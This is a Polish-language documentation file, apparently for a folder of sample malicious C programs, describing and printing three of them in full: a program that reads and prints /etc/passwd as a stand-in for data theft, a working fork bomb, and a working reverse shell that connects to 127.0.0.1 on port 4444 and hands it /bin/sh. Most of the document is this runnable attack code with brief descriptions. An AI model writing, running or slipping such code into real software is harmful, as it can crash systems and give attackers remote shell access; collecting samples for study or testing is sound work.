# Dokumentacja Złośliwego Kodu w C

## Wprowadzenie

Ta dokumentacja opisuje trzy przykłady złośliwego kodu dostarczone w tym folderze. Każdy program jest napisany w języku C i ma na celu symulowanie określonego wektora ataku.

## `malicious_code_1.c`: Eksfiltracja Danych

Ten program próbuje odczytać zawartość pliku `/etc/passwd`, który zawiera listę użytkowników w systemach uniksowych. W rzeczywistym ataku dane te zostałyby wysłane na zdalny serwer. W tym przykładzie dane są po prostu drukowane na standardowe wyjście.

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    FILE *fp;
    char ch;

    fp = fopen("/etc/passwd", "r");
    if (fp == NULL) {
        printf("Cannot open file \n");
        exit(0);
    }

    ch = fgetc(fp);
    while (ch != EOF) {
        printf("%c", ch);
        ch = fgetc(fp);
    }

    fclose(fp);
    return 0;
}
```

## `malicious_code_2.c`: Bomba Widelcowa (Fork Bomb)

Ten program tworzy klasyczną bombę widelcową. W nieskończonej pętli tworzy nowe procesy, co prowadzi do wyczerpania zasobów systemowych i potencjalnie do awarii systemu.

```c
#include <unistd.h>

int main() {
    while(1) {
        fork();
    }
    return 0;
}
```

## `malicious_code_3.c`: Odwrotna Powłoka (Reverse Shell)

Ten program próbuje utworzyć odwrotną powłokę do określonego adresu IP i portu. Jeśli się powiedzie, atakujący uzyska zdalny dostęp do powłoki na maszynie, na której uruchomiono program.

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr.s_addr = inet_addr("127.0.0.1");

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
```
